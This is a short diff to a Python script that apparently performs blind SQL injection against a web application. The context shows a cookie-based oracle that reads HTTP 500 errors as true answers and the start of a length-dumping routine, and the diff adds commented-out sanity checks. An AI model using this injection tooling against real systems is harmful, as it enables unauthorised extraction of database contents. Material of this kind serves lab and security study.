@@ -15,6 +15,12 @@ def oracle(q):
     response = requests.get(f"{url()}",cookies=cookies)
     return response.status_code == 500
 
+# confirm oracle can run
+"""
+assert oracle("1=1")
+assert oracle("1=0")
+"""
+
 # Calculat the Length
 def dump_length(q):
     low = 0
